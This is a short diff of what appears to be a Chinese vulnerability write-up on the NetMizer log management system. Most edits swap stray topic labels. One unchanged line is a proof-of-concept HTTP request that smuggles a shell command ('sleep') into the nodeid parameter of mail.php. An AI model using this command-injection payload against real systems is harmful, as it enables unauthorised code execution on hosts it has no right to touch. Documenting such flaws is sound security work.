@@ -22,11 +22,11 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 深入探索
 
+软件
+
 计算机服务器
 
-计算机科学
-
-书籍
+计算机安全
 
 看下 `mail.php` 业务实现关键逻辑部分
 
@@ -201,7 +201,7 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机安全
+网络安全
 
 ```
 GET /data/search/mail.php?action=file&nodeid=1;sleep+3 HTTP/1.1
